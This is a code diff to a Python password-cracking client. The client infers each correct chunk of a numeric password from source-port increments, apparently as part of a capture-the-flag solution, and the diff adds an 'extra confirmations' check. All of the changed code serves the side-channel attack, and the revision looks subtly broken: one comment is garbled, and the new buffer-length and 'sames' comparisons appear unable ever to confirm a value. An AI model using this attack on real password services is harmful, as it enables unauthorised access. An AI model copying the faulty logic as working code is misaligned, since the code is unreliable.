@@ -82,8 +82,10 @@ class Client(object):
 
     PASSWORD_LENGTH = 12
     CHUNKS = 4
-    #: Required confirmations before a value is considered confirmed.
-    CONFIRMATIONS = 3
+    #: Required confirmations before a value is considered considered (wrong)?
+    CONFIRMATIONS = 2
+    #: How many extra confirmations should it take to confirm a *good* value?
+    EXTRA_CONFIRMATIONS = 1
     #: The minimum of source port increments, ie. a password with the first
     #: chunk wrong. This depends on your network configuration, required DNS
     #: lookups and so on.
@@ -98,7 +100,8 @@ class Client(object):
         self.last_source_port = 0
         self.weirdness = 0
 
-        self.delta_confirmer = DeltaConfirmer(self.CONFIRMATIONS)
+        self.delta_confirmer = DeltaConfirmer(self.CONFIRMATIONS,
+                                              self.EXTRA_CONFIRMATIONS)
 
 
     def generate_pw(self):
@@ -134,20 +137,24 @@ class Client(object):
                 print("SUCCESS: {0}".format(self.generate_pw()))
                 return
 
-            delta = self.delta_confirmer.confirm(result)
+            delta, confident = self.delta_confirmer.confirm(result)
             log.debug("delta={0}, pw={1}".format(delta, pw))
             # Not a stable data, run again.
             if delta < 1:
                 continue
 
-            self.consider_delta(delta)
+            self.consider_delta(delta, confident)
 
         sys.stderr.write("Could not find password. Is it non-numeric?")
 
-    def consider_delta(self, delta):
+    def consider_delta(self, delta, confident):
         if delta == (self.MIN_SOCKETS + self.chunk):
             self.counter += 1
         elif delta == (self.MIN_SOCKETS + self.chunk + 1):
+            # Just once more.
+            if not confident:
+                return
+
             log.info("Found chunk #{0}. Current PW: {1}".format(
                 self.chunk, self.generate_pw()))
             self.verified_chunks.append(str(self.counter))
@@ -169,17 +176,28 @@ class Client(object):
 
 class DeltaConfirmer(object):
 
-    def __init__(self, confirmations):
+    def __init__(self, confirmations, extra=0):
         self.confirmations = confirmations
+        self.extra = extra
         self.last_source_port = 0
 
         self.reset()
 
     def reset(self):
-        self.ringbuffer = collections.deque(maxlen=self.confirmations)
+        self.ringbuffer = collections.deque(maxlen=(self.confirmations +
+                                                    self.extra))
 
     def confirm(self, result):
-        """Calculate the delta from the result."""
+        """Calculate the delta from the result. Returns a tuple of
+
+            (delta, confident)
+
+        Where ``delta`` is either a positive value that has been repeated at
+        the last ``self.confirmations`` times or a negative value indicating
+        an irregular delta.
+
+        Confident is True if the value also satisfies the extra checks.
+        """
 
         delta = result.source_port - self.last_source_port
         self.last_source_port = result.source_port
@@ -190,16 +208,18 @@ class DeltaConfirmer(object):
 
         # Either first connect or counter reset
         if delta < 1:
-            return delta
+            return (delta, False)
 
         self.ringbuffer.append(delta)
 
         if len(self.ringbuffer) == self.confirmations:
             value = self.ringbuffer.popleft()
-            if all(map(lambda x: x == value, self.ringbuffer)):
-                return value
+            sames = len(filter(lambda x: x == value, self.ringbuffer))
 
-        return -1
+            if sames > self.confirmations:
+                return value, (sames == self.confirmations + self.extra)
+
+        return (-1, False)
 
 
 def start_server():
